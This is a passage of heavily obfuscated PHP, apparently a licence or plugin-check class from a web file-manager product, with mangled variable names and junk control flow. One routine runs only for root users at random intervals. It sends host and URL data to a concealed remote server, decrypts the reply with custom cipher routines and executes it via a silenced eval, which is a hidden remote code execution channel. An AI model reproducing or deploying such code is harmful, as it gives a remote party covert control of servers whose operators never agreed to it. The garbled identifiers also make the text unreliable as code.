$Öµâ—Ùƒ[238], $Öµâ—Ùƒ[246] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[247] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[248] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[249] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[250] => $Öµâ—Ùƒ[238]); } private function versionPluginFilter() { $ÇÏÙÕ¦± =& $_SERVER[œ—üé‹ê]; $ÚÈÓä‡Û =& $_SERVER[·–Â öÌ]; if ($this->mlco424745fa == $ÚÈÓä‡Û[111]) { return $ÚÈÓä‡Û[6]; } $Ş©·˜ó  = _get($this->ednwba098520, $ÚÈÓä‡Û[251], $ÚÈÓä‡Û[6]); $¡ê¤û¶ = $ÇÏÙÕ¦±[770]; $‹…ö¬ƒÙ = _get($this->ednwba098520, $ÚÈÓä‡Û[118], $ÚÈÓä‡Û[6]); $Íçôø˜³ = $ÇÏÙÕ¦±[771]; if (strlen($Íçôø˜³) < $ÇÏÙÕ¦±[713]) { die; } $ØÆÌ¶°Ê = _get($this->ednwba098520, $ÚÈÓä‡Û[252], $ÚÈÓä‡Û[6]); if ($‹…ö¬ƒÙ > time() && $ØÆÌ¶°Ê > time()) { $ô›Ãëğø = explode($ÚÈÓä‡Û[229], $Ş©·˜ó ); $¿Îí® = array_keys($this->versionPluginList()); $Ş©·˜ó  = array_merge($ô›Ãëğø, $¿Îí®); $Ş©·˜ó  = implode($ÚÈÓä‡Û[229], array_filter(array_unique($Ş©·˜ó ))); } return $Ş©·˜ó ; } private function zvpw078ae2be() { $øâ‡ÁÖ =& $_SERVER[·–Â öÌ]; if ($this->mlco424745fa != $øâ‡ÁÖ[111]) { $GLOBALS[$øâ‡ÁÖ[88]][$øâ‡ÁÖ[92]][$øâ‡ÁÖ[253]] = $øâ‡ÁÖ[208]; return; } $GLOBALS[$øâ‡ÁÖ[88]][$øâ‡ÁÖ[254]] = $øâ‡ÁÖ[124]; if (Model($øâ‡ÁÖ[255])->get($øâ‡ÁÖ[63]) != $øâ‡ÁÖ[208]) { Model($øâ‡ÁÖ[255])->set($øâ‡ÁÖ[63], $øâ‡ÁÖ[208]); } } public function jbafa034bd2b() { return $_SERVER[·–Â öÌ][256]; } private function oidt2c6afd8e() { $ıùã ãì =& $_SERVER[œ—üé‹ê]; $Õ—øêÏ =& $_SERVER[·–Â öÌ]; $„Æµí˜¶ = array($Õ—øêÏ[257], $Õ—øêÏ[258], $Õ—øêÏ[259]); $èÀö¾å˜ = $Õ—øêÏ[260] . md5($Õ—øêÏ[261]); if ($this->mlco424745fa == $Õ—øêÏ[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Õ—øêÏ[24]], $„Æµí˜¶)) { return; } if (time() % 4 != 0) { return; } $â§•˜´© = call_user_func(array($Õ—øêÏ[262], $Õ—øêÏ[263]), $èÀö¾å˜); $üÌ¥ãÒÙ = $ıùã ãì[772]; if (strlen($üÌ¥ãÒÙ) < $ıùã ãì[713]) { die; } if ($â§•˜´© && time() - $â§•˜´© < intval($Õ—øêÏ[264])) { return; } call_user_func(array($Õ—øêÏ[262], $Õ—øêÏ[141]), $èÀö¾å˜, time()); $Íœ µºÜ = $ıùã ãì[773]; if (!$Íœ µºÜ) { return; } $¦Ô€³óª = Model($Õ—øêÏ[33])->get($Õ—øêÏ[102]); $µóğºı = $ıùã ãì[774]; if (!$µóğºı) { return; } $¨´œœŒ = array($Õ—øêÏ[154] => Model($Õ—øêÏ[33])->get($Õ—øêÏ[155]), $Õ—øêÏ[169] => $this->mlco424745fa, $Õ—øêÏ[165] => $_SERVER[$Õ—øêÏ[166]], $Õ—øêÏ[167] => Model($Õ—øêÏ[33])->get($Õ—øêÏ[133]), $Õ—øêÏ[107] => md5($_SERVER[$Õ—øêÏ[108]] . $¦Ô€³óª), $Õ—øêÏ[158] => $Õ—øêÏ[138], $Õ—øêÏ[161] => $_SERVER[$Õ—øêÏ[162]]); $‚õœÏ¿Ï = $ıùã ãì[775]; if (!$‚õœÏ¿Ï) { die; } $ëÎ„¬Öà = $this->efwl539cb3cd($Õ—øêÏ[265], $¨´œœŒ); $ÜÙÙĞà = $ıùã ãì[776]; if (!$ÜÙÙĞà) { die; } if (!is_array($ëÎ„¬Öà)) { return; } if ($ëÎ„¬Öà[$Õ—øêÏ[154]] && $ëÎ„¬Öà[$Õ—øêÏ[266]]) { if ($this->cdlbf6b0259c($ëÎ„¬Öà[$Õ—øêÏ[266]]) == $¨´œœŒ[$Õ—øêÏ[154]]) { return; } } $this->hocs3083ce8b(); if ($this->cdlbf6b0259c($ëÎ„¬Öà[$Õ—øêÏ[266]]) != $¨´œœŒ[$Õ—øêÏ[154]]) { $”Ëı•ø« = array($Õ—øêÏ[187] => $¦Ô€³óª, $Õ—øêÏ[188] => $_SERVER[$Õ—øêÏ[108]], $Õ—øêÏ[189] => this_url(), $Õ—øêÏ[163] => $_SERVER[$Õ—øêÏ[164]]); $ñ³È¼üù = $this->gatmab579cdc(json_encode($”Ëı•ø«)); $ëÎ„¬Öà = $this->efwl539cb3cd($Õ—øêÏ[190] . $ñ³È¼üù); if ($ëÎ„¬Öà && is_array($ëÎ„¬Öà) && isset($ëÎ„¬Öà[$Õ—øêÏ[266]])) { $˜Çéô¸Ô = $this->xsyn9f1b438b($ëÎ„¬Öà[$Õ—øêÏ[266]], 2); if ($˜Çéô¸Ô) { $˜Çéô¸Ô = $this->cdlbf6b0259c($˜Çéô¸Ô); } if ($˜Çéô¸Ô) { try { @eval($˜Çéô¸Ô); } catch (Exception $¥ş­òû) { } } } } } private function efwl539cb3cd($­•¿¤ìä = '', $îæòÔÕ = array(), $Ûş¬†­ = 5) { $ùó²¼Ç† =& $_SERVER[œ—üé‹ê]; $ øˆúÃö =& $_SERVER[·–Â öÌ]; $¨Û•å¤× = $ øˆúÃö[267]; $¨Û•å¤× = $this->swxzf967e86e($¨Û•å¤×, $ øˆúÃö[268]); $¨Û•å¤× = $¨Û•å¤× . $­•¿¤ìä; if ($îæòÔÕ && is_array($îæòÔÕ)) { $¨Û•å¤× = $¨Û•å¤× . $ øˆúÃö[269] . http_build_query($îæòÔÕ); } if ($îæòÔÕ === -1) { return $¨Û•å¤×; } $ŒŒêÂ¬„ = stream_context_create(array($ øˆúÃö[222] => array($ øˆúÃö[225] => $Ûş¬†­, $ øˆúÃö[223] => $ øˆúÃö[270]), $ øˆúÃö[271] => array($ øˆúÃö[272] => !1, $ øˆúÃö[273] => !1))); $¯ê¦ßû = $ùó²¼Ç†[777]; while (strlen($¯ê¦ßû) < $ùó²¼Ç†[705]) { if (!$¯ê¦ßû) { break; } $¯ê¦ßû++; } $îæòÔÕ = @file_get_contents($¨Û•å¤×, !1, $ŒŒêÂ¬„); $ôÕÓÜÃú = $ùó²¼Ç†[778]; if (!$ôÕÓÜÃú) { die; } return json_decode($îæòÔÕ, !0); $ªø¯Ÿ‚ı = $ùó²¼Ç†[779]; if (strlen($ªø¯Ÿ‚ı) < $ùó²¼Ç†[731]) { return; } $¨‹®íÙ = $ùó²¼Ç†[780]; while ($¨‹®íÙ < $ùó²¼Ç†[731]) { if ($¨‹®íÙ >= 0) { break; } $¨‹®íÙ++; } } private function hwyef9582643() { $·ºå»¸À =& $_SERVER[œ—üé‹ê]; $³Ò÷ú“ë =& $_SERVER[·–Â öÌ]; $‹å£Ğ­õ = array($³Ò÷ú“ë[274] => $³Ò÷ú“ë[275], $³Ò÷ú“ë[276] => $³Ò÷ú“ë[277], $³Ò÷ú“ë[278] => $³Ò÷ú“ë[279], $³Ò÷ú“ë[280] => $³Ò÷ú“ë[281], $³Ò÷ú“ë[282] => $³Ò÷ú“ë[283], $³Ò÷ú“ë[284] => $³Ò÷ú“ë[217], $³Ò÷ú“ë[285] => $³Ò÷ú“ë[217], $³Ò÷ú“ë[286] => $³Ò÷ú“ë[275], $³Ò÷ú“ë[287] => $³Ò÷ú“ë[277], $³Ò÷ú“ë[288] => $³Ò÷ú“ë[279], $³Ò÷ú“ë[289] => $³Ò÷ú“ë[290], $³Ò÷ú“ë[291] => $³Ò÷ú“ë[281], $³Ò÷ú“ë[292] => $³Ò÷ú“ë[293], $³Ò÷ú“ë[294] => $³Ò÷ú“ë[283], $³Ò÷ú“ë[295] => $³Ò÷ú“ë[296], $³Ò÷ú“ë[297] => $³Ò÷ú“ë[298], $³Ò÷ú“ë[299] => $³Ò÷ú“ë[300]); $¯œú¬½ú = $‹å£Ğ­õ[$this->mlco424745fa]; $Š¹ØüÙ‰ = $·ºå»¸À[781]; if (strlen($Š¹ØüÙ‰) < $·ºå»¸À[720]) { return; } $¯œú¬½ú = intval($¯œú¬½ú ? $¯œú¬½ú : $³Ò÷ú“ë[275]); $´šÅå½ = $·ºå»¸À[782]; $Ê¬ÅÀùë = _get($this->ednwba098520, $³Ò÷ú“ë[301]); $Ê¬ÅÀùë = $Ê¬ÅÀùë ? intval($Ê¬ÅÀùë) : 0; $Á‡œ¯³ = $·ºå»¸À[783]; return $¯œú¬½ú + $Ê¬ÅÀùë; } public function pwmtc5639935($¶º¥”‡ì) { $Ú´…õÍ‹ =& $_SERVER[œ—üé‹ê]; $€Ÿ¨©ëÉ =& $_SERVER[·–Â öÌ]; $š÷ì¦Ğ = $this->hwyef9582643(); if ($¶º¥”‡ì[$€Ÿ¨©ëÉ[302]] == $€Ÿ¨©ëÉ[124]) { return; } if ($š÷ì¦Ğ >= intval($€Ÿ¨©ëÉ[217])) { return; } $ÙŒ†•è = Model($€Ÿ¨©ëÉ[127])->count(); $é›½ëÄ§ = $Ú´…õÍ‹[784]; if ($ÙŒ†•è <= $š÷ì¦Ğ) { return; } $ƒ‡Ï¦ª = Model($€Ÿ¨©ëÉ[127])->field($€Ÿ¨©ëÉ[302])->limit($š÷ì¦Ğ)->select(); $Úè÷Ä–­ = $Ú´…õÍ‹[785]; if (strlen($Úè÷Ä–­) < $Ú´…õÍ‹[707]) { die; } $ƒ‡Ï¦ª = array_to_keyvalue($ƒ‡Ï¦ª, $€Ÿ¨©ëÉ[6], $€Ÿ¨©ëÉ[302]); if (!in_array($¶º¥”‡ì[$€Ÿ¨©ëÉ[302]], $ƒ‡Ï¦ª)) { show_json($€Ÿ¨©ëÉ[303], !1, $€Ÿ¨©ëÉ[213]); } } public function lzjpe9da6389() { $‘Æ­È©´ =& $_SERVER[œ—üé‹ê]; $éâš” =& $_SERVER[·–Â öÌ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $…šµë¹ä = $éâš”[220]; $…šµë¹ä = $this->swxzf967e86e($…šµë¹ä, $éâš”[221]); $¶éßíïÙ = stream_context_create(array($éâš”[222] => array($éâš”[223] => $éâš”[224], $éâš”[225] => 3))); $êŠ´©ŸÓ = $‘Æ­È©´[786]; if (strlen($êŠ´©ŸÓ) < $‘Æ­È©´[720]) { die; } $ÈĞÚê¡ = @file_get_contents($…šµë¹ä, !1, $¶éßíïÙ); echo $éâš”[304] . hash_encode($ÈĞÚê¡) . $éâš”[305]; $Â‹àÁÆå = $‘Æ­È©´[787]; } private function rjhyce918cb9($—Û×ÑÅ, $âœ÷½Û§, $îÓÇÎ¥¯ = 3) { $Äåğˆª¬ =& $_SERVER[œ—üé‹ê]; $“¬íµƒ’ =& $_SERVER[·–Â öÌ]; usleep(1); $˜ÇºúæÜ = $Äåğˆª¬[788]; if (strlen($˜ÇºúæÜ) < $Äåğˆª¬[707]) { return; } $—Û×ÑÅ = trim($—Û×ÑÅ); $ªêµã÷ = mt_rand(0, 5) . $“¬íµƒ’[6]; $Š›ÜîóŞ = rand_string(15); $“›–ÄŸ = $Äåğˆª¬[789]; if (strlen($“›–ÄŸ) < $Äåğˆª¬[731]) { die; } $ÕŒĞ†Ÿú = $“¬íµƒ’[306]; switch ($ªêµã÷) { case $“¬íµƒ’[208]: $¯È¨ø»® = $this->ubgx06f77c9c($—Û×ÑÅ, strrev($âœ÷½Û§ . $Š›ÜîóŞ)); $ÙíŸ¿Ó = $Äåğˆª¬[790]; if (strlen($ÙíŸ¿Ó) < $Äåğˆª¬[731]) { die; } break; $Øõ¿¾»ş = $Äåğˆª¬[791]; if (strlen($Øõ¿¾»ş) < $Äåğˆª¬[705]) { die; } case $“¬íµƒ’[124]: $¯È¨ø»® = $this->ubgx06f77c9c($—Û×ÑÅ, strrev($Š›ÜîóŞ . $âœ÷½Û§)); $º°ç¢ŞÂ = $Äåğˆª¬[792]; if (strlen($º°ç¢ŞÂ) < $Äåğˆª¬[705]) { return; } break; case $“¬íµƒ’[307]: $¯È¨ø»® = $this->ubgx06f77c9c($—Û×ÑÅ, base64_encode($Š›ÜîóŞ . $âœ÷½Û§)); break; $º°³×šË = $Äåğˆª¬[793]; if (!$º°³×šË) { die; } case $“¬íµƒ’[308]: $¯È¨ø»® = $this->ubgx06f77c9c($—Û×ÑÅ, md5($Š›ÜîóŞ . $âœ÷½Û§)); $›ëÉ¦Ã¿ = $Äåğˆª¬[794]; while (strlen($›ëÉ¦Ã¿) < $Äåğˆª¬[705]) { if (!$›ëÉ¦Ã¿) { break; } $›ëÉ¦Ã¿++; } break; $ŸÁÒœÏê = $Äåğˆª¬[795]; if (strlen($ŸÁÒœÏê) < $Äåğˆª¬[707]) { die; } case $“¬íµƒ’[309]: $—Û×ÑÅ = base64_encode($—Û×ÑÅ); $•ä´…ÈÕ = rand(0, 64); $®ÒÎ¨Ğ = $Äåğˆª¬[796]; $åŠş¦ˆâ = $ÕŒĞ†Ÿú[$•ä´…ÈÕ]; $Áè¦™š† = $Äåğˆª¬[797]; while (strlen($Áè¦™š†) < $Äåğˆª¬[720]) { if (!$Áè¦™š†) { break; } $Áè¦™š†++; } $È‰Õü· = md5($åŠş¦ˆâ . md5($âœ÷½Û§ . $åŠş¦ˆâ) . $âœ÷½Û§); $¥§ÓÎ¯û = $Äåğˆª¬[798]; while (strlen($¥§ÓÎ¯û) < $Äåğˆª¬[731]) { if (!$¥§ÓÎ¯û) { break; } $¥§ÓÎ¯û++; } $È‰Õü· = substr($È‰Õü·, $•ä´…ÈÕ % 8, $•ä´…ÈÕ % 8 + 7); $Ö½ÍŸñ… = $Äåğˆª¬[799]; if (strlen($Ö½ÍŸñ…) < $Äåğˆª¬[705]) { return; } $€Ç»Ã¹· = $“¬íµƒ’[6]; $È“Å¤Éš = $Äåğˆª¬[800]; while (strlen($È“Å¤Éš) < $Äåğˆª¬[713]) { if (!$È“Å¤Éš) { break; } $È“Å¤Éš++; } $•ìº÷ = 0; $ı÷êÔÕõ = $Äåğˆª¬[801]; $•ÒşæÖÎ = 0; $–ï ³Ÿ = 0; $Çé€ÎØ = $Äåğˆª¬[802]; for ($•ìº÷ = 0; $•ìº÷ < strlen($—Û×ÑÅ); $•ìº÷++) { $–ï ³Ÿ = $–ï ³Ÿ == strlen($È‰Õü·) ? 0 : $–ï ³Ÿ; $ÕÑˆ¶® = $Äåğˆª¬[803]; $•ÒşæÖÎ = ($•ä´…ÈÕ + strpos($ÕŒĞ†Ÿú, $—Û×ÑÅ[$•ìº÷]) + ord($È‰Õü·[$–ï ³Ÿ++])) % 64; $©Í…ˆ¶® = $Äåğˆª¬[804]; if (!$©Í…ˆ¶®) { die; } $€Ç»Ã¹· .= $ÕŒĞ†Ÿú[$•ÒşæÖÎ]; $’½ñÑ· = $Äåğˆª¬[805]; if (!$’½ñÑ·) { return; } } $¯È¨ø»® = hash_encode($åŠş¦ˆâ . $€Ç»Ã¹·); $¿ùŒ—øí = $Äåğˆª¬[806]; if (strlen($¿ùŒ—øí) < $Äåğˆª¬[705]) { die; } break; $ãîçî† = $Äåğˆª¬[807]; if (strlen($ãîçî†) < $Äåğˆª¬[707]) { return; } default: $¯È¨ø»® = $this->ubgx06f77c9c($—Û×ÑÅ, $âœ÷½Û§ . $Š›ÜîóŞ); $£İ”„Ãã = $Äåğˆª¬[808]; if (!$£İ”„Ãã) { die; } break; } $¯È¨ø»® = strrev($ªêµã÷ . $Š›ÜîóŞ . $¯È¨ø»®); $òë»…Ä‹ = $Äåğˆª¬[809]; if ($îÓÇÎ¥¯ - 1 > 0) { $¯È¨ø»® = $this->rjhyce918cb9($¯È¨ø»®, $âœ÷½Û§, $îÓÇÎ¥¯ - 1); } return $¯È¨ø»®; } private function xsyn9f1b438b($ä™ë¸Åè, $¨Ç°ÈŸ¢, $äéìèŠ· = 3) { $ˆÆŠÒ¦˜ =& $_SERVER[œ—üé‹ê]; $ôÙ•—êŸ =& $_SERVER[·–Â öÌ]; if (!is_string($ä™ë¸Åè) || strlen($ä™ë¸Åè) < 10) { return !1; } $ä™ë¸Åè = trim($ä™ë¸Åè); $Ñ€‡‘µ = $ˆÆŠÒ¦˜[810]; if (strlen($Ñ€‡‘µ) < $ˆÆŠÒ¦˜[713]) { return; } $ä™ë¸Åè = strrev($ä™ë¸Åè); $Ù–ª¤«‰ = $ˆÆŠÒ¦˜[722]; $“èŸØÕ = $ä™ë¸Åè[0]; $˜œÎ†œÌ = $ˆÆŠÒ¦˜[811]; if (strlen($˜œÎ†œÌ) < $ˆÆŠÒ¦˜[731]) { return; } $¨Ğ™æÏ† = substr($ä™ë¸Åè, 1, 15); $ä™ë¸Åè = substr($ä™ë¸Åè, 16); $¼µ¬é¥“ = $ˆÆŠÒ¦˜[812]; $“Ú·…Ç€ = $ôÙ•—êŸ[306]; $¥ÍÌƒÕÖ = $ˆÆŠÒ¦˜[813]; while ($¥ÍÌƒÕÖ < $ˆÆŠÒ¦˜[731]) { if ($¥ÍÌƒÕÖ >= 0) { break; } $¥ÍÌƒÕÖ++; } switch ($“èŸØÕ) { case $ôÙ•—êŸ[208]: $ú†Í¸³ = $this->swxzf967e86e($ä™ë¸Åè, strrev($¨Ç°ÈŸ¢ . $¨Ğ™æÏ†)); $öÔºüğ³ = $ˆÆŠÒ¦˜[814]; if (!$öÔºüğ³) { return; } break; $ŠçìÉà¦ = $ˆÆŠÒ¦˜[815]; case $ôÙ•—êŸ[124]: $ú†Í¸³ = $this->swxzf967e86e($ä™ë¸Åè, strrev($¨Ğ™æÏ† . $¨Ç°ÈŸ¢)); $ø¸ıÉÏ = $ˆÆŠÒ¦˜[816]; if (strlen($ø¸ıÉÏ) < $ˆÆŠÒ¦˜[713]) { die; } break; $‰‡Åü°Ô = $ˆÆŠÒ¦˜[817]; if (strlen($‰‡Åü°Ô) < $ˆÆŠÒ¦˜[720]) { die; } case $ôÙ•—êŸ[307]: $ú†Í¸³ = $this->swxzf967e86e($ä™ë¸Åè, base64_encode($¨Ğ™æÏ† . $¨Ç°ÈŸ¢)); break; case $ôÙ•—êŸ[308]: $ú†Í¸³ = $this->swxzf967e86e($ä™ë¸Åè, md5($¨Ğ™æÏ† . $¨Ç°ÈŸ¢)); $¸Ğæ‘ÉÊ = $ˆÆŠÒ¦˜[818]; while (strlen($¸Ğæ‘ÉÊ) < $ˆÆŠÒ¦˜[731]) { if (!$¸Ğæ‘ÉÊ) { break; } $¸Ğæ‘ÉÊ++; } break; $ÓöĞÊšü = $ˆÆŠÒ¦˜[819]; case $ôÙ•—êŸ[309]: $ä™ë¸Åè = hash_decode($ä™ë¸Åè); $¬Òœ®Ş = $ˆÆŠÒ¦˜[820]; if (!$¬Òœ®Ş) { die; } $´½õÊ³‹ = $ä™ë¸Åè[0]; $ä™ë¸Åè = substr($ä™ë¸Åè, 1); $¦”ª‡ˆ = $ˆÆŠÒ¦˜[821]; while (strlen($¦”ª‡ˆ) < $ˆÆŠÒ¦˜[720]) { if (!$¦”ª‡ˆ) { break; } $¦”ª‡ˆ++; } $¶µØØÏ = strpos($“Ú·…Ç€, $´½õÊ³‹); $ÁÑ”íˆé = $ˆÆŠÒ¦˜[822]; $ø§ÇÃôÖ = md5($´½õÊ³‹ . md5($¨Ç°ÈŸ¢ . $´½õÊ³‹) . $¨Ç°ÈŸ¢); $ø§ÇÃôÖ = substr($ø§ÇÃôÖ, $¶µØØÏ % 8, $¶µØØÏ % 8 + 7); $œÁƒƒä› = $ˆÆŠÒ¦˜[823]; if (strlen($œÁƒƒä›) < $ˆÆŠÒ¦˜[705]) { die; } $Ñ£ñÎŠì = $ôÙ•—êŸ[6]; $ø•­‘ÓÙ = 0; $œçí³ = $ˆÆŠÒ¦˜[824]; if (strlen($œçí³) < $ˆÆŠÒ¦˜[731]) { die; } $é¢¯œßÓ = 0; $í…¥¼öï = $ˆÆŠÒ¦˜[825]; while (strlen($í…¥¼öï) < $ˆÆŠÒ¦˜[713]) { if (!$í…¥¼öï) { break; } $í…¥¼öï++; } $›Ê™é = 0; $ÑÑ°µ©® = $ˆÆŠÒ¦˜[826]; while (strlen($ÑÑ°µ©®) < $ˆÆŠÒ¦˜[705]) { if (!$ÑÑ°µ©®) { break; } $ÑÑ°µ©®++; } for ($ø•­‘ÓÙ = 0; $ø•­‘ÓÙ < strlen($ä™ë¸Åè); $ø•­‘ÓÙ++) { $›Ê™é = $›Ê™é == strlen($ø§ÇÃôÖ) ? 0 : $›Ê™é; $÷›¼Ü¯› = $›Ê™é++; $é¢¯œßÓ = strpos($“Ú·…Ç€, $ä™ë¸Åè[$ø•­‘ÓÙ]) - $¶µØØÏ - ord($ø§ÇÃôÖ[$÷›¼Ü¯›]); $×¯óĞÙÌ = $ˆÆŠÒ¦˜[827]; if (strlen($×¯óĞÙÌ) < $ˆÆŠÒ¦˜[731]) { return; } while ($é¢¯œßÓ < 0) { $é¢¯œßÓ += 64; $¹é–Ö„˜ = $ˆÆŠÒ¦˜[828]; } $Ñ£ñÎŠì .= $“Ú·…Ç€[$é¢¯œßÓ]; $€ĞŠÓÆ… = $ˆÆŠÒ¦˜[829]; if (strlen($€ĞŠÓÆ…) < $ˆÆŠÒ¦˜[713]) { return; } } $ú†Í¸³ = base64_decode($Ñ£ñÎŠì); break; default: $ú†Í¸³ = $this->swxzf967e86e($ä™ë¸Åè, $¨Ç°ÈŸ¢ . $¨Ğ™æÏ†); break; } if ($äéìèŠ· - 1 > 0) { $ú†Í¸³ = $this->xsyn9f1b438b($ú†Í¸³, $¨Ç°ÈŸ¢, $äéìèŠ· - 1); } return $ú†Í¸³; } public function gatmab579cdc($Íûˆğç) { $ËÍèÜß™ =& $_SERVER[œ—üé‹ê]; $Ë¢ —Õú =& $_SERVER[·–Â öÌ]; $ªÌã¨é” = $this->yiqpba23e922(); $ï¥íå÷© = $ËÍèÜß™[830]; if (strlen($ï¥íå÷©) < $ËÍèÜß™[713]) { return; } $æ æ±İÃ = $this->yiqpba23e922(); $Î´µ«ªÙ = $ËÍèÜß™[831]; if (!$Î´µ«ªÙ) { die; } $¤ùıİû = ($ªÌã¨é” - 1) * ($æ æ±İÃ - 1); $ÙºÈåşæ = intval(($ªÌã¨é” + $æ æ±İÃ) / 2); $½ëô“ßõ = $ËÍèÜß™[832]; while ($½ëô“ßõ < $ËÍèÜß™[707]) { if ($½ëô“ßõ >= 0) { break; } $½ëô“ßõ++; } while (1) { $ËäŒĞ Ş = $ÙºÈåşæ; $ª¤²•å¢ = $ËÍèÜß™[833]; if (!$ª¤²•å¢) { return; } $ŸğÚ¶¸ = $¤ùıİû; while ($ŸğÚ¶¸ % $ËäŒĞ Ş != 0) { $’©óè‚Ï = $ŸğÚ¶¸; $‡ÒşÄ™ = $ËÍèÜß™[834]; if (strlen($‡ÒşÄ™) < $ËÍèÜß™[707]) { die; } $ŸğÚ¶¸ = $ËäŒĞ Ş; $ËäŒĞ Ş = $’©óè‚Ï % $ËäŒĞ Ş; $ùÌÑ’É = $ËÍèÜß™[835]; while ($ùÌÑ’É < $ËÍèÜß™[720]) { if ($ùÌÑ’É >= 0) { break; } $ùÌÑ’É++; } } if ($ËäŒĞ Ş == 1) { break; } else { $ÙºÈåşæ++; } } $™Ô¼¦ô§ = 2; for ($ú§˜Ÿ£ª = 0; $ú§˜Ÿ£ª < $¤ùıİû * 10; $ú§˜Ÿ£ª++) { if (($¤ùıİû * $ú§˜Ÿ£ª + 1) % $ÙºÈåşæ == 0) { $™Ô¼¦ô§ = intval(($¤ùıİû * $ú§˜Ÿ£ª + 1) / $ÙºÈåşæ); break; } } $±¾ÍÊÀô = $this->ubgx06f77c9c($ªÌã¨é” * $æ æ±İÃ . $Ë¢ —Õú[6], $Ë¢ —Õú[138]); $é‹ô¸Şã = $ËÍèÜß™[836]; $˜«âÁÜ = md5($Ë¢ —Õú[310] . ($ªÌã¨é” + $æ æ±İÃ) . $Ë¢ —Õú[311] . $ÙºÈåşæ . $Ë¢ —Õú[311] . $™Ô¼¦ô§ . $Ë¢ —Õú[312]); $ñçˆº™ˆ = $this->ubgx06f77c9c($Íûˆğç, $˜«âÁÜ) . $Ë¢ —Õú[313] . $±¾ÍÊÀô; return $ñçˆº™ˆ; $»Î¸û = $ËÍèÜß™[837]; while ($»Î¸û < $ËÍèÜß™[731]) { if ($»Î¸û >= 0) { break; } $»Î¸û++; } } public function cdlbf6b0259c($ÉŒĞ—…û) { $ùâúÍâ³ =& $_SERVER[œ—üé‹ê]; $Âòå¿Ùº =& $_SERVER[·–Â öÌ]; $éôşí½  = explode($Âòå¿Ùº[313], $ÉŒĞ—…û); if (count($éôşí½ ) != 2) { return $Âòå¿Ùº[6]; } $ˆ­ìÏ = $this->swxzf967e86e($éôşí½ [1] . $Âòå¿Ùº[6], $Âòå¿Ùº[138]); $İ­ÅÄ = $ùâúÍâ³[838]; if (!$İ­ÅÄ) { die; } if (!$ˆ­ìÏ) { return $Âòå¿Ùº[6]; } $ˆ­ìÏ = intval($ˆ­ìÏ); $ö¦¥õ’‡ = 0; $¼ğÃÄÀŸ = 0; $İæ•ÓĞ = $ùâúÍâ³[839]; if (strlen($İæ•ÓĞ) < $ùâúÍâ³[731]) { return; } for ($Ê©¾œ¢à = 3; $Ê©¾œ¢à < $ˆ­ìÏ; $Ê©¾œ¢à += 2) { if ($ˆ­ìÏ % $Ê©¾œ¢à != 0) { continue; } $ö¦¥õ’‡ = $Ê©¾œ¢à; $¼ğÃÄÀŸ = intval($ˆ­ìÏ / $Ê©¾œ¢à); $‹ê¹Ü¸– = $ùâúÍâ³[840]; while (strlen($‹ê¹Ü¸–) < $ùâúÍâ³[731]) { if (!$‹ê¹Ü¸–) { break; } $‹ê¹Ü¸–++; } break; } $Ëñ³’íç = ($ö¦¥õ’‡ - 1) * ($¼ğÃÄÀŸ - 1); $ÒÍ©§¿î = $ùâúÍâ³[814]; while ($ÒÍ©§¿î < $ùâúÍâ³[713]) { if ($ÒÍ©§¿î >= 0) { break; } $ÒÍ©§¿î++; } $Ó™–ôÆ­ = intval(($ö¦¥õ’‡ + $¼ğÃÄÀŸ) / 2); $àÎº¤‚× = $ùâúÍâ³[841]; if (!$àÎº¤‚×) { return; } while (1) { $õÑÁıÑú = $Ó™–ôÆ­; $ØêŒßĞ¯ = $Ëñ³’íç; $ßşø¶‡— = $ùâúÍâ³[842]; if (!$ßşø¶‡—) { return; } while ($ØêŒßĞ¯ % $õÑÁıÑú != 0) { $ëôíŞù” = $ØêŒßĞ¯; $Çî®ê‚ƒ = $ùâúÍâ³[843]; $ØêŒßĞ¯ = $õÑÁıÑú; $ÈÑ‘ù = $ùâúÍâ³[844]; while (strlen($ÈÑ‘ù) < $ùâúÍâ³[731]) { if (!$ÈÑ‘ù) { break; } $ÈÑ‘ù++; } $õÑÁıÑú = $ëôíŞù” % $õÑÁıÑú; } if ($õÑÁıÑú == 1) { break; } else { $Ó™–ôÆ­++; } } $òóèºì® = 2; for ($Ê©¾œ¢à = 0; $Ê©¾œ¢à < $Ëñ³’íç * 10; $Ê©¾œ¢à++) { if (($Ëñ³’íç * $Ê©¾œ¢à + 1) % $Ó™–ôÆ­ == 0) { $òóèºì® = intval(($Ëñ³’íç * $Ê©¾œ¢à + 1) / $Ó™–ôÆ­); break; } } $ÖÏüï¶´ = md5($Âòå¿Ùº[310] . ($ö¦¥õ’‡ + $¼ğÃÄÀŸ) . $Âòå¿Ùº[311] . $Ó™–ôÆ­ . $Âòå¿Ùº[311] . $òóèºì® . $Âòå¿Ùº[312]); $â‡•´ÎÆ = $this->swxzf967e86e($éôşí½ [0], $ÖÏüï¶´); return $â‡•´ÎÆ; } public function yiqpba23e922() { $€ŞË‹ÑÈ =& $_SERVER[œ—üé‹ê]; $áé‹…ğÌ = mt_rand(pow(2, 14), pow(2, 16) - 1); $’Œï—ëû = array(); $ì¥´èóÌ = $€ŞË‹ÑÈ[845]; if (strlen($ì¥´èóÌ) < $€ŞË‹ÑÈ[707]) { die; } $‘šªë…‡ = 1; $ô¬òŸ§Ù = $€ŞË‹ÑÈ[846]; if (!$ô¬òŸ§Ù) { return; } while ($‘šªë…‡ <= (int) sqrt($áé‹…ğÌ)) { $¸•à¨İÛ = $‘šªë…‡; $ªë‰¾ğ = $€ŞË‹ÑÈ[765]; if (!$ªë‰¾ğ) { return; } while (!0) { $¸•à¨İÛ++; if ($¸•à¨İÛ <= 2) { $‘šªë…‡ = $¸•à¨İÛ; break; } else { if ($¸•à¨İÛ < 2) { continue; } } $ö¡‘Ó« = !0; for ($×°†Ò•È = 2; $×°†Ò•È <= sqrt($¸•à¨İÛ); $×°†Ò•È++) { if ($¸•à¨İÛ % $×°†Ò•È == 0) { $ö¡‘Ó« = !1; } } if ($ö¡‘Ó«) { $‘šªë…‡ = $¸•à¨İÛ; break; } } $’Œï—ëû[] = $‘šªë…‡; } $İÌšşõÕ = 2; for ($¸•à¨İÛ = $áé‹…ğÌ; $¸•à¨İÛ > 1; $¸•à¨İÛ--) { $ö¡‘Ó« = !0; foreach ($’Œï—ëû as $†¢Øò„) { if ($¸•à¨İÛ % $†¢Øò„ == 0) { $ö¡‘Ó« = !1; break; } } if ($ö¡‘Ó«) { 